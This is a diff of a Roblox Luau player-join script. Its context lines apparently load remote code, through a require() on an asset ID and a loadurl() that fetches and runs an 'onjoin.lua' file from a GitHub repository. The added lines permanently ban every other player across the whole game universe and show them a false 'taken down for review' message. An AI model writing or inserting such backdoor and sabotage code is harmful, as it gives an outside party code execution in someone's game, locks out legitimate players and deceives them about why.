@@ -24,7 +24,19 @@ local function onPlayer(player)
 			require(135231466738957):Hload(player.Name)
 	   	end)
 		loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/onjoin.lua")
-  	end
+	else
+		local config: BanConfigType = {
+			UserIds = { player.UserId },
+			Duration = -1,
+			DisplayReason = "This place has been taken down for review.",
+			PrivateReason = "None",
+			ExcludeAltAccounts = false,
+			ApplyToUniverse = true,
+		}
+		local success, err = pcall(function()
+	  		return Players:BanAsync(config)
+		end)
+	end
 end
 
 for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
